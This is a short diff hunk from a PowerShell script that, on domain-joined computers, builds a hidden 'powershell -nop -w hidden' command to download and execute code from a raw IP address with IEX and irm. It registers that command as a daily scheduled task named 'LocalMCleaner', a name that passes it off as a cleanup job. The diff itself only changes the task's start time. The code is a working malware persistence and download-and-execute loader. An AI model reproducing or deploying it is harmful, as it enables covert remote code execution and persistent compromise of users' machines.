@@ -15,7 +15,7 @@ if ($computerInfo.CsPartOfDomain)
     } catch { 
     }  
     $ccc = '"' + "powershell.exe -nop -w hidden -c  " + "'IEX (irm http://64.182.116.12/images/II11II11)" + "'" +'"'
-    $str = "schtasks.exe /create /sc daily /tn LocalMCleaner /tr " + $ccc +" /st 13:40 /f"
+    $str = "schtasks.exe /create /sc daily /tn LocalMCleaner /tr " + $ccc +" /st 11:59 /f"
     iex  $str
 } 
 else
